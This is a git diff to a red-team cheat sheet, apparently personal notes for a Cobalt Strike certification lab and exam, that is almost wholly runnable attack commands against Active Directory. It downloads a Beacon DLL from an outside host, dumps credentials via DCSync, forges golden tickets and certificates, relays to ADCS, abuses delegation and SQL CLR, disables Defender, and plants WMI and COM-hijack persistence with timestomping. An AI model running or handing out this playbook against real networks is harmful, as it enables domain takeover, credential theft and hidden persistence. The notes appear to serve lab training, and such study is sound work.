@@ -360,7 +360,7 @@ $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
 $env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
 .\ngentask.exe
 ```
->Download Beacon DLL to Workstation as user, `Invoke-WebRequest` works in `ConstrainedLanguage` and execute DLL   
+>Download Beacon DLL to Workstation as user, `Invoke-WebRequest` works in AppLocker `ConstrainedLanguage` policy and execute DLL   
 ```powershell
 cd C:\Windows\Tasks\
 Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
@@ -609,9 +609,15 @@ sql-enableclr lon-db-1
 ```cs
 sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
 ```
->TSVCPIPE name defined in CS SMB listener. Run this from SQL user beacon, not from any impersonated session, need valid TGT in the session to auto-request CIFS.  
+>Pipe name is set STATICALLY in Cobalt Strike GUI — Listeners > SMB listener > Pipename (C2) field. NOT set by `post-ex { set pipename }` in the Malleable C2 profile (that controls fork-and-run post-ex pipes only — completely separate).  
+>Run `link` from the SQL user beacon only, not from any impersonated session — needs a valid TGT in session to auto-request CIFS ticket.  
+>Lab default pipe name (original course value): `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337`  
+>Exam2 custom pipe name (set in GUI SMB listener): `dotnet-diagnost-6845-ceeb-b00b-63676827406`  
 ```cs
+// LAB (London SQL)
 link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
+// EXAM2 (Dublin SQL) — use your configured SMB listener pipe name
+link dub-sql-1 dotnet-diagnost-6845-ceeb-b00b-63676827406
 ```
 >Show all SQL linked servers configured on lon-db-1
 ```cs
@@ -721,3 +727,301 @@ getsystem
 ```
 mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
 ```
+
+# CRTO Lab Commands
+
+>Outbound Trusts  
+```
+ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
+ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
+
+mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
+
+krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
+
+ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
+```
+
+>Inbound Trusts
+```
+ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
+ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
+ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName
+ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
+
+nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
+
+ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
+
+download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+
+ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member
+ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name
+ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes distinguishedName
+
+dcsync contoso.com CONTOSO\rsteel
+
+krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
+krb_asktgs /service:krbtgt/partner.com /ticket:[TGT]
+krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:[INTER-REALM]
+ls \\\\par-jmp-1.partner.com\\c$
+```
+
+>Parent Child Trusts
+```
+ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
+ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
+ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
+
+dcsync dublin.contoso.com DUBLIN\krbtgt
+
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
+
+kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET].kirbi
+run klist
+
+ls \\\\lon-dc-1\\c$
+```
+
+>DPERSIST1 for Domain Persistence Golden Certificates, admin persistence
+```
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
+
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))
+
+C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:[FORGED CERT] /enctype:aes256 /nowrap
+```
+
+>ADCS ESC8
+```
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
+
+socks 1080 socks5
+netstat
+
+sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
+sc_stop lanmanserver
+sc_stop srv2
+sc_stop srvnet
+
+netstat
+rportfwd_local 445 localhost 7445
+netstat
+
+powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
+
+docker container start -i kali-1
+nano /etc/proxychains.conf
+
+socks5 10.0.0.5 1080
+
+proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
+
+socks stop
+rportfwd stop 445
+sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
+sc_start srvnet
+sc_start srv2
+sc_start lanmanserver
+
+powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
+```
+
+ADCS ESC1
+```
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
+```
+
+SQL Servers
+```
+ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
+
+sql-info lon-db-1
+sql-whoami lon-db-1
+
+ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
+
+sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
+
+sql-enableclr lon-db-1
+
+C:\Payloads\smb_x64.xthread.bin
+
+sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
+
+link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
+// EXAM2: link dub-sql-1 dotnet-diagnost-6845-ceeb-b00b-63676827406
+
+sql-disableclr lon-db-1
+
+sql-links lon-db-1
+
+sql-whoami lon-db-1 "" lon-db-2
+sql-checkrpc lon-db-1
+
+sql-enablerpc lon-db-1 lon-db-2
+
+sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
+
+sql-disablerpc lon-db-1 lon-db-2
+whoami
+
+C:\Payloads\tcp-local_x64.exe
+
+cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
+upload C:\Payloads\tcp-local_x64.exe
+
+execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
+connect localhost 1337
+```
+
+>RBCD
+```
+socks 1080 socks5
+
+Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+krb_tgtdeleg
+runas /netonly /user:CONTOSO\pchilds powershell
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
+
+ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
+Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
+Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
+
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
+
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
+
+Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+
+$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
+$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
+Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
+
+Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
+
+Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
+Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+```
+
+>S4U2Self
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
+execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
+
+krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
+```
+
+>Service Name Substitution
+```
+krb_s4u /ticket:[TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
+```
+
+>Constrained Delegation
+```
+ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
+
+[Convert]::ToBoolean(16781312 -band 16777216)
+
+krb_dump /luid:3e7 /service:krbtgt
+krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
+```
+
+>Unconstrained Delegation
+```
+ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
+
+krb_triage
+
+ldapsearch samAccountName=dyork --attributes memberOf
+
+krb_dump /user:dyork /service:krbtgt
+```
+
+>Lateral Movement
+```
+ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`
+jump scshell64 xxx-xxxxx-2 smb
+```
+
+>User Impersonation
+```
+ls \\\\lon-ws-1\\c$
+
+krb_triage
+krb_dump /user:rsteel /service:krbtgt
+
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
+
+make_token CONTOSO\rsteel FakePass
+kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
+
+run klist
+ls \\\\lon-ws-1\\c$
+rev2self
+```
+
+>Elevated Persistence
+```
+C:\Tools\WmiPersistence.ps1
+
+C:\Payloads\dns_x64.exe
+
+upload C:\Payloads\dns_x64.exe
+mv dns_x64.exe windbg.exe
+
+powershell-import C:\Tools\WmiPersistence.ps1
+psinject [BEACON PID] x64 Add-WmiPersistence
+execute gpupdate /target:computer /force
+psinject [BEACON PID] x64 Remove-WmiPersistence
+```
+
+>Privilege Escalation
+```
+spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+
+powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
+
+ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+
+C:\Payloads\http_x64.svc.exe
+sc_stop BadWindowsService
+
+cd C:\Temp
+upload C:\Payloads\http_x64.svc.exe
+
+sc_qc BadWindowsService
+sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
+sc_start BadWindowsService
+
+sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
+rm http_x64.svc.exe
+sc_start BadWindowsService
+```
+
+>Persistence
+```
+C:\Payloads\http_x64.dll
+
+cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
+
+upload C:\Payloads\http_x64.dll
+
+mv http_x64.dll Microsoft.Teams.HttpClient.dll
+timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
+
+reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
+reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
+```
+
